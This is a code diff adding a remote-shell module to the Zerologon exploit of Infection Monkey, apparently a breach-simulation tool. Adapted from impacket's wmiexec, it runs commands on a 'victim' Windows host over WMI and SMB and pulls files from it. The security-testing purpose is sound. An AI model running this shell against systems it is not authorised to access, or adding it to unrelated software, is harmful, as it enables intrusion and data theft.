+++ monkey/infection_monkey/exploit/zerologon_utils/remote_shell.py
@@ -1,0 +1,127 @@
+import cmd
+import logging
+import ntpath
+import os
+import sys
+import time
+
+LOG = logging.getLogger(__name__)
+
+
+# Adapted from https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
+# Used to start remote shell on victim
+class RemoteShell(cmd.Cmd):
+    CODEC = sys.stdout.encoding
+
+    def __init__(self, share, win32Process, smbConnection, outputFilename):
+        cmd.Cmd.__init__(self)
+        self.__share = share
+        self.__output = '\\' + outputFilename
+        self.__outputBuffer = str('')
+        self.__shell = 'cmd.exe /Q /c '
+        self.__win32Process = win32Process
+        self.__transferClient = smbConnection
+        self.__pwd = str('C:\\')
+        self.__noOutput = False
+
+        # We don't wanna deal with timeouts from now on.
+        if self.__transferClient is not None:
+            self.__transferClient.setTimeout(100000)
+            self.do_cd('\\')
+        else:
+            self.__noOutput = True
+
+    def do_get(self, src_path):
+        try:
+            import ntpath
+            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
+            drive, tail = ntpath.splitdrive(newPath)
+            filename = ntpath.basename(tail)
+            local_file_path = os.path.join(
+                os.path.expanduser('~'), 'monkey-'+filename)
+            fh = open(local_file_path, 'wb')
+            LOG.info("Downloading %s\\%s" % (drive, tail))
+            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
+            fh.close()
+        except Exception as e:
+            LOG.error(str(e))
+            if os.path.exists(local_file_path):
+                os.remove(local_file_path)
+
+    def do_exit(self, s):
+        return True
+
+    def do_cd(self, s):
+        self.execute_remote('cd ' + s)
+        if len(self.__outputBuffer.strip('\r\n')) > 0:
+            print(self.__outputBuffer)
+            self.__outputBuffer = ''
+        else:
+            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
+            self.execute_remote('cd ')
+            self.__pwd = self.__outputBuffer.strip('\r\n')
+            self.prompt = (self.__pwd + '>')
+            self.__outputBuffer = ''
+
+    def default(self, line):
+        # Let's try to guess if the user is trying to change drive.
+        if len(line) == 2 and line[1] == ':':
+            # Execute the command and see if the drive is valid.
+            self.execute_remote(line)
+            if len(self.__outputBuffer.strip('\r\n')) > 0:
+                # Something went wrong.
+                print(self.__outputBuffer)
+                self.__outputBuffer = ''
+            else:
+                # Drive valid, now we should get the current path.
+                self.__pwd = line
+                self.execute_remote('cd ')
+                self.__pwd = self.__outputBuffer.strip('\r\n')
+                self.prompt = (self.__pwd + '>')
+                self.__outputBuffer = ''
+        else:
+            if line != '':
+                self.send_data(line)
+
+    def get_output(self):
+        def output_callback(data):
+            try:
+                self.__outputBuffer += data.decode(self.CODEC)
+            except UnicodeDecodeError:
+                LOG.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
+                          'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute wmiexec.py '
+                          'again with -codec and the corresponding codec')
+                self.__outputBuffer += data.decode(self.CODEC,
+                                                   errors='replace')
+
+        if self.__noOutput is True:
+            self.__outputBuffer = ''
+            return
+
+        while True:
+            try:
+                self.__transferClient.getFile(
+                    self.__share, self.__output, output_callback)
+                break
+            except Exception as e:
+                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
+                    # Output not finished, let's wait.
+                    time.sleep(1)
+                elif str(e).find('Broken') >= 0:
+                    # The SMB Connection might have timed out, let's try reconnecting.
+                    LOG.debug('Connection broken, trying to recreate it')
+                    self.__transferClient.reconnect()
+                    return self.get_output()
+        self.__transferClient.deleteFile(self.__share, self.__output)
+
+    def execute_remote(self, data):
+        command = self.__shell + data
+        if self.__noOutput is False:
+            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output + ' 2>&1'
+        self.__win32Process.Create(command, self.__pwd, None)
+        self.get_output()
+
+    def send_data(self, data):
+        self.execute_remote(data)
+        print(self.__outputBuffer)
+        self.__outputBuffer = ''
